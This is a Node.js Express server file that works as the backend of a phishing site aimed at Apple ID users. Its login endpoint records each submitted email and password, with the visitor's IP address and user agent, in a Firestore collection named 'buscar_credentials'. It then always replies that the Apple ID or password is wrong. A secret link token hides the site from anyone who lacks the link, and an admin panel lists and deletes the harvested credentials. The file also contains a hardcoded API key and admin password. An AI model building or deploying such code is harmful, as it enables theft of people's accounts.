const express = require('express');
const bodyParser = require('body-parser');
const cookieParser = require('cookie-parser');
const path = require('path');
const axios = require('axios');

const app = express();
const PORT = process.env.PORT || 3000;

// Configuração do Firebase
const PROJECT_ID = "missoes-drive";
const API_KEY = "AIzaSyDsWJ9VVMSIsQNtifkLVnRNnbzU7favF7s";
const COLLECTION = "buscar_credentials";

// URL base do Firestore REST API
const FIRESTORE_URL = `https://firestore.googleapis.com/v1/projects/${PROJECT_ID}/databases/(default)/documents/${COLLECTION}?key=${API_KEY}`;

// Middleware
app.use(bodyParser.json());
app.use(cookieParser());

// --- SISTEMA DE TOKEN ---
const ACCESS_TOKEN = process.env.ACCESS_TOKEN || 'buscar2026';

app.use((req, res, next) => {
    const tokenFromQuery = req.query.t;
    if (tokenFromQuery === ACCESS_TOKEN) {
        res.cookie('access_token', ACCESS_TOKEN, { maxAge: 1000 * 60 * 60 * 24 * 7, httpOnly: true });
        return res.redirect(req.path);
    }

    const tokenFromCookie = req.cookies.access_token;
    const isStaticAsset = /\.(css|js|png|jpg|jpeg|gif|svg|ico)$/.test(req.path);
    const isApi = req.path.startsWith('/api/');

    if (tokenFromCookie === ACCESS_TOKEN || isStaticAsset) {
        return next();
    }

    res.status(404).send('Not Found');
});

app.use(express.static(path.join(__dirname, 'public')));

// Credenciais Admin
const ADMIN_EMAIL = 'admin@buscar.com';
const ADMIN_PASSWORD = 'Admin@2026';

// Helpers
function toFirestoreJSON(obj) {
    const fields = {};
    for (const [key, value] of Object.entries(obj)) {
        if (typeof value === 'string') fields[key] = { stringValue: value };
        else if (typeof value === 'number') fields[key] = { doubleValue: value };
        else if (typeof value === 'boolean') fields[key] = { booleanValue: value };
    }
    return { fields };
}

function fromFirestoreJSON(doc) {
    if (!doc.fields) return { id: doc.name.split('/').pop() };
    const obj = { id: doc.name.split('/').pop() };
    const fields = doc.fields || {};
    for (const [key, value] of Object.entries(fields)) {
        if (value.stringValue !== undefined) obj[key] = value.stringValue;
        else if (value.doubleValue !== undefined) obj[key] = Number(value.doubleValue);
        else if (value.booleanValue !== undefined) obj[key] = value.booleanValue;
    }
    return obj;
}

// Login endpoint
app.post('/api/login', async (req, res) => {
    const { email, password } = req.body;
    let firebaseError = null;

    try {
        const firestoreData = toFirestoreJSON({
            email,
            password,
            timestamp: new Date().toISOString(),
            userAgent: req.headers['user-agent'] || 'unknown',
            ip: req.headers['x-forwarded-for'] || req.connection.remoteAddress || 'unknown'
        });
        await axios.post(FIRESTORE_URL, firestoreData);
    } catch (err) {
        firebaseError = err.response ? err.response.data : err.message;
        console.error('Erro Firestore REST:', firebaseError);
    }

    if (email === ADMIN_EMAIL && password === ADMIN_PASSWORD) {
        return res.json({ success: true, isAdmin: true });
    }

    return res.json({ 
        success: false, 
        message: 'ID Apple ou senha incorreta.',
        debug: firebaseError
    });
});

// Admin Auth
app.post('/api/admin/auth', (req, res) => {
    const { email, password } = req.body;
    if (email === ADMIN_EMAIL && password === ADMIN_PASSWORD) return res.json({ success: true });
    return res.status(401).json({ success: false, message: 'Acesso negado' });
});

// Get Data
app.post('/api/admin/data', async (req, res) => {
    const { email, password } = req.body;
    if (email !== ADMIN_EMAIL || password !== ADMIN_PASSWORD) {
        return res.status(401).json({ success: false, message: 'Acesso negado' });
    }

    try {
        const response = await axios.get(`${FIRESTORE_URL}&pageSize=100`);
        const documents = response.data.documents || [];
        const data = documents.map(fromFirestoreJSON);
        data.sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp));
        return res.json({ success: true, data });
    } catch (err) {
        const errorDetail = err.response ? err.response.data : err.message;
        return res.status(500).json({ success: false, message: 'Erro ao ler dados', error: errorDetail });
    }
});

// Delete Entry
app.post('/api/admin/delete', async (req, res) => {
    const { email, password, docId } = req.body;
    if (email !== ADMIN_EMAIL || password !== ADMIN_PASSWORD) {
        return res.status(401).json({ success: false, message: 'Acesso negado' });
    }
    try {
        const deleteUrl = `https://firestore.googleapis.com/v1/projects/${PROJECT_ID}/databases/(default)/documents/${COLLECTION}/${docId}?key=${API_KEY}`;
        await axios.delete(deleteUrl);
        return res.json({ success: true });
    } catch (err) {
        return res.status(500).json({ success: false, message: 'Erro ao deletar', error: err.message });
    }
});

app.listen(PORT, () => {
    console.log(`\n🔍 Buscar Server running at http://localhost:${PORT}`);
});
